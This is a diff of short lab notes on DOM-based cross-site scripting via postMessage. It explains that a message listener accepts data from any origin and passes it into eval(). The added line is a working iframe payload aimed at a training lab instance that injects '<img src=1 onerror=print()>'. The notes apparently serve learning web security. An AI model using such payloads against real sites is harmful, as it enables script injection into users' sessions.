@@ -12,3 +12,4 @@ window.addEventListener('message', function(e) {
 ```
 - A JavaScript payload can be constructed with the following `iframe`: `<iframe src="//vulnerable-website" onload="this.contentWindow.postMessage('print()','*')">`
 - As the event listener does not verify the origin of the message, and the `postMessage()` method specifies the `targetOrigin` `"*"`, the event listener accepts the payload and passes it into a sink, in this case, the `eval()` function. 
+`<iframe src="https://0a390037031267ee81e74052003b00de.web-security-academy.net" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">`
